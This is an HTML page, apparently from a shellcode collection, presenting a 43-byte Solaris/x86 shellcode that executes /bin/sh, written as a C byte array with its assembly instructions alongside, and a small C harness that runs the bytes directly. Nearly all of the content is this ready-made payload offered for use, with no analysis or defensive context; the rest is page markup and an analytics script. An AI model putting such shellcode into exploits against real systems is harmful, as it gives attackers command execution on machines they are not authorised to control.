<html><head><title>Solaris/x86 - execve /bin/sh - 43 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * Solaris shellcode - execve /bin/sh
 */

#include 

// http://www.shellcode.com.ar
//
// execve(//bin/sh)

char shellcode[]=
   &quot;\xb8\xff\xf8\xff\x3c&quot;       // mov    eax, 03cfff8ffh
   &quot;\xf7\xd0&quot;                   // not    eax
   &quot;\x50&quot;                       // push   eax
   &quot;\x31\xc0&quot;                   // xor    eax, eax
   &quot;\xb0\x9a&quot;                   // mov    al, 09ah
   &quot;\x50&quot;                       // push   eax
   &quot;\x89\xe5&quot;                   // mov    ebp, esp
   &quot;\x31\xc0&quot;                   // xor    eax, eax
   &quot;\x50&quot;                       // push   eax
   &quot;\x68\x2f\x2f\x73\x68&quot;       // push   dword 68732f2fh
   &quot;\x68\x2f\x62\x69\x6e&quot;       // push   dword 6e69622fh
   &quot;\x89\xe3&quot;                   // mov    ebx, esp
   &quot;\x50&quot;                       // push   eax
   &quot;\x53&quot;                       // push   ebx
   &quot;\x89\xe2&quot;                   // mov    edx, esp
   &quot;\x50&quot;                       // push   eax
   &quot;\x52&quot;                       // push   edx
   &quot;\x53&quot;                       // push   ebx
   &quot;\xb0\x3b&quot;                   // mov    al, 59
   &quot;\xff\xd5&quot;;                  // call   ebp

//

int
main(void)
{
    void (*code)() = (void *)shellcode;
    printf(&quot;Shellcode length: %d\n&quot;, strlen(shellcode));
    code();
    return(1);
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
